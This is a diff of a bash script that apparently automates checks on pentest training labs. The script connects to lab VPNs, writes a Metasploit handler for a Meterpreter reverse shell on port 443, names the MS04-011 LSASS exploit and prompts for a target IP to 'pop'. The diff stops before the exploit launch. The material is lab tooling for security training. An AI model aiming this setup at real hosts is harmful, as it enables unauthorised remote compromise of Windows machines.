@@ -3,124 +3,160 @@
 # Written to test the labs while a lab admin ...
 # If you dont understand the functionality, dont run the script - SIMPLE
 #
-echo -e "[*]"
-echo -e "[*] Labs Fuckifier...err Verifier Script"
-echo -e "[*] Intellectual Property of Myself, Coded in: 2011"
-echo -e "[*]\tWritten by: William no1special Coppola"
-echo -e "[*]\t\tRESEARCH IS THE KEY TO UNLOCK KNOWLEDGE\n[*]"
-echo -e "[*] For proper use of this script, you should understand the source...."
-echo;
-echo -e "[*] \t\tif [ 'you' != 'like' ];then"
-echo -e "[*] \t\t   Go Fuckifier yourself!"
-echo -e "[*] \t\tfi"
-echo -e "[*]"
+title() {
+  echo;
+  echo -e "({[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]})";
+  echo -e "  [*] Labs Fuckifier...err Verifier Script";
+  echo -e "  [*] Intellectual Property of Myself, Coded in: 2011";
+  echo -e "  [*]\tWritten by: William no1special Coppola";
+  echo -e "  [*]\t\tRESEARCH IS THE KEY TO UNLOCK KNOWLEDGE";
+  echo -e "  [*] For proper use of this script, you should understand the source....";
+  echo -e "  [*] \t\tif [ 'you' != 'like' ];then";
+  echo -e "  [*] \t\t   Go Fuckifier yourself!";
+  echo -e "  [*] \t\tfi";
+  echo -e "[{(+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++)}]";
+  echo;
+}
+title;
 ################################################################################
 #
 # set some variables for the application, ... I dont think this is a script anymore ....
 #
-lab11="/root/lab11/lab.conf" # vpn info
-lab13="/root/lab13/lab.conf" # vpn info
-lab15="/root/lab15/lab.conf" # vpn info
-msfp="/pentest/exploits/framework3" # msf dir
-msfc=$msfp"/msfconsole" # msf console
-msfs=$msfp"/scripts" # msf scripts dir
-lp="443" # multilistener port  -  the rest should be self describing ...
-iface1=`ifconfig | grep -B2 "10.10.10.1" | grep tap | cut -d" " -f1`
-iface2=`ifconfig | grep -B2 "10.10.12.1" | grep tap | cut -d" " -f1`
-iface3=`ifconfig | grep -B2 "10.10.14.1" | grep tap | cut -d" " -f1`
-lh1=`ifconfig $iface1 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1`
-lh2=`ifconfig $iface2 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1`
-lh3=`ifconfig $iface3 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1`
-pay="windows/meterpreter/reverse_tcp"
-apay="exploit/windows/smb/ms04_011_lsass"
-DH="DisablePayloadHandler=true"
+setlabvars() {
+  lab11="/root/lab11/lab.conf" # vpn config
+  lab13="/root/lab13/lab.conf" # vpn config
+  lab15="/root/lab15/lab.conf" # vpn config
+  msfp="/pentest/exploits/framework3" # metasploit directory
+  msfc=$msfp"/msfconsole" # msfconsole
+  msfs=$msfp"/scripts" # msfscripts dir
+  lp="443" # multihandler port  -  the rest should be self describing ...
+  iface1=`ifconfig | grep -B2 "10.10.10.1" | grep tap | cut -d" " -f1` # VPN Interface
+  iface2=`ifconfig | grep -B2 "10.10.12.1" | grep tap | cut -d" " -f1` # VPN Interface
+  iface3=`ifconfig | grep -B2 "10.10.14.1" | grep tap | cut -d" " -f1` # VPN Interface
+  lh1=`ifconfig $iface1 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1` # VPN Static IP
+  lh2=`ifconfig $iface2 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1` # VPN Static IP
+  lh3=`ifconfig $iface3 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1` # VPN Static IP
+  pay="windows/meterpreter/reverse_tcp" # metasploit payload
+  apay="exploit/windows/smb/ms04_011_lsass" # metasploit exploits Windows (Pre WanaCry)
+  DH="DisablePayloadHandler=true" # Disable metasploit Payload Handler
+}
+setlabvars;
 #
 # check for vpn access's
 #
-if [ `ifconfig | grep "Bcast:10.10.11.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];then
- echo -e "\n\t[*] Labs 11 are active and connected with the IP of" $lh1
-else
- echo -e "\n\t[*] Starting Labs 11 vpn connection"
- xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab11
- echo -e "\n\t[*] Labs 11 are active and connected with the IP of" $lh1
-fi
+checkVPN11access() {
+  if [ `ifconfig | grep "Bcast:10.10.11.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];
+    then
+      echo -e "\n\t[*] Labs 11 are active and connected with the IP of" $lh1
+    else
+     echo -e "\n\t[*] Starting Labs 11 vpn connection"
+     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab11
+     echo -e "\n\t[*] Labs 11 are active and connected with the IP of" $lh1
+  fi
+}
+checkVPN11access;
 #
 #
 #
-if [ `ifconfig | grep "Bcast:10.10.13.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];then
- echo -e "\n\t[*] Labs 13 are active and connected with the IP of" $lh2
-else
- echo -e "\n\t[*] Starting Labs 13 vpn connection"
- xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab13
- echo -e "\n\t[*] Labs 13 are active and connected with the IP of" $lh2
-fi
+checkVPN13access() {
+  if [ `ifconfig | grep "Bcast:10.10.13.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];
+    then
+      echo -e "\n\t[*] Labs 13 are active and connected with the IP of" $lh2
+    else
+     echo -e "\n\t[*] Starting Labs 13 vpn connection"
+     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab13
+     echo -e "\n\t[*] Labs 13 are active and connected with the IP of" $lh2
+  fi
+}
+checkVPN13access;
 #
 #
 #
-if [ `ifconfig | grep "Bcast:10.10.15.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];then
- echo -e "\n\t[*] Labs 15 are active and connected with the IP of" $lh3
-else
- echo -e "\n\t[*] Starting Labs 15 vpn connection"
- xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab15
- echo -e "\n\t[*] Labs 15 are active and connected with the IP of" $lh3
-fi
+checkVPN15access() {
+  if [ `ifconfig | grep "Bcast:10.10.15.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];
+    then
+      echo -e "\n\t[*] Labs 15 are active and connected with the IP of" $lh3
+    else
+      echo -e "\n\t[*] Starting Labs 15 vpn connection"
+      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab15
+      echo -e "\n\t[*] Labs 15 are active and connected with the IP of" $lh3
+  fi
+}
+checkVPN15access;
 #
 #
-#
-echo -e "\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n"
+# line break function
+checkthebrakes() {
+  echo -e "\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n"
+}
+checkthebrakes;
 #
 # Checks for Ckermit FTP ...
-#
-if [ ! -f /usr/bin/kermit ];
-  then
-    apt-get update && apt-get install ckermit
-fi
+checkCkermit() {
+  if [ ! -f /usr/bin/kermit ];
+    then
+      apt-get update && apt-get install ckermit
+  fi
+}
+checkCkermit;
 #
 # produce the multihandler recourse file
-#
-if [ ! -f /pentest/exploits/framework3/scripts/mh.rc ];then
- echo -e "use exploit/multi/handler" >>  /pentest/exploits/framework3/scripts/mh.rc
- echo -e "set PAYLOAD windows/meterpreter/reverse_tcp" >>  /pentest/exploits/framework3/scripts/mh.rc
- echo -e "set LPORT 443" >>  /pentest/exploits/framework3/scripts/mh.rc
- echo -e "set LHOST 0.0.0.0" >> /pentest/exploits/framework3/scripts/mh.rc
- echo -e "set ExitOnSession false" >>  /pentest/exploits/framework3/scripts/mh.rc
- echo -e "exploit -j -z" >>  /pentest/exploits/framework3/scripts/mh.rc
-fi
+makehandler() {
+  if [ ! -f $msfs/mh.rc ];then
+    echo -e "use exploit/multi/handler" >> $msfs/mh.rc
+    echo -e "set PAYLOAD $pay" >> $msfs/mh.rc
+    echo -e "set LPORT 443" >> $msfs/mh.rc
+    echo -e "set LHOST 0.0.0.0" >> $msfs/mh.rc
+    echo -e "set ExitOnSession false" >> $msfs/mh.rc
+    echo -e "exploit -j -z" >> $msfs/mh.rc
+  fi
+}
+makehandler;
 #
 # Produces the ./multi.sh script to be used to launch the multihandler and starts it in the background
-#
-if [ ! -f /pentest/exploits/framework3/multi.sh ]; 
-  then
-    cat << EOF > /pentest/exploits/framework3/multi.sh 
+mhScript() {
+  if [ ! -f $msfp/multi.sh ]; 
+    then
+      cat << EOF > $msfp/multi.sh 
 #!/bin/bash
 msfp="/pentest/exploits/framework3"
-msfc=$msfp"/msfconsole"
+msfc="/pentest/exploits/framework3/msfconsole"
 echo -e "[*]\tMetasploit Multihandler Launching Now...";
-xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "multihandler window" -e $msfc /pentest/exploits/framework3/scripts/mh.rc  &
+xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "multihandler window" -e $msfc $msfp/scripts/mh.rc  &
 EOF
-chmod a+x /pentest/exploits/framework3/multi.sh
-fi
-#
+    chmod a+x $msfp/multi.sh
+  fi
+}
+mhScript;
 # Check if there is  a multihandler already listening on 0.0.0.0:443 or if the service is litening on this port already ... continue if so
 #
-chkmh=`netstat -ant | grep "0.0.0.0:443" | tr -s " " | cut -d" " -f4`
-if [ "$chkmh" != "0.0.0.0:443" ];
-  then
-    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "multihandler window" -e /pentest/exploits/framework3/msfconsole -r /pentest/exploits/framework3/scripts/mh.rc &
-  else
-    echo -e "\n\n\t[*] The Multihandler is already functional!"
-fi
-#
+checkMH() {
+  chkmh=`netstat -ant | grep "0.0.0.0:443" | tr -s " " | cut -d" " -f4`
+  if [ "$chkmh" != "0.0.0.0:443" ];
+    then
+      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "multihandler window" -e /pentest/exploits/framework3/msfconsole -r /pentest/exploits/framework3/scripts/mh.rc &
+    else
+      echo -e "\n\n\t[*] The Multihandler is already functional!"
+  fi
+}
+checkMH;
 # Read from STDIN and take IP as variable and compair it to a list of known targets....
 #
-echo -e "\n\n[*] What do you want to do?\n\n\t[*] Answers are: '{pop} {revert} {firewall}' choose wisely "
-read select
-if [ $select == "pop" ];
-  then
-    echo -e "\n[*] Please enter an IP address to test ...\n\t"
-    read uip
-    echo ""
-fi
+takeIP() {
+  checkthebrakes;
+  echo -e "\n\n[*] What do you want to do?\n\n\t[*] Answers are: '{pop} {revert} {firewall}' choose wisely "
+  read select;
+  if [ $select == "pop" ];
+    then
+      echo -e "\n[*] Please enter an IP address to test ...\n\t"
+      read uip
+      echo ""
+  fi
+}
+takeIP;
+
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$ STOPPED HERE $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #
 # start alice
 #
